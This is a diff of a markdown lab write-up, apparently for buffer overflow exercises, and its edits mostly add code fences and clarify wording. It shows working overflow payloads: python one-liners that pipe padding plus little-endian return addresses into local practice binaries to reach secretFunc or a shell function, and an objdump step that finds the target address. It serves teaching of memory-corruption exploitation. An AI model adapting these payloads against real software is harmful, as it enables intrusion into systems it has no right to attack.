@@ -52,6 +52,7 @@ If an attacker supplies more input than the buffer array[200] can handle, they c
      ![image](https://github.com/user-attachments/assets/7ee1e5e0-441a-4a39-9a40-bb98f3545acc)
   
   The secretFunc() memory region is `0x0804846b`
+  
   3. Input 'a'*204 followed by `0x0804846b`
      ```bash
      echo $( python -c "print('a'*204 + '\x6b\x84\x04\x08')") | ./bof1.out
@@ -89,9 +90,9 @@ Terminal will be return  `You are on the right way!`
 
 
 If you want to print `Yeah! You win!`
-
+```bash
 echo $(python -c "print('a'*40 + '\xef\xbe\xad\xde' )") | ./bof2.out
-
+```
 ![image](https://github.com/user-attachments/assets/57848a21-9021-4c9c-994a-555c01043102)
 
 
@@ -110,7 +111,7 @@ objdump -d bof3.out | grep shell
 
  ![image](https://github.com/user-attachments/assets/2298c0b9-23b6-4bd3-b4fb-31c653e51de7)
 
-you can see `0804845b`  <shell>  and after that:
+you can see the address of  `<shell>` is `0804845b`  and after that:
 
 ```bash
 echo $(python -c "print('a'*128 + '\x5b\x84\x04\x08')") | ./bof3.out
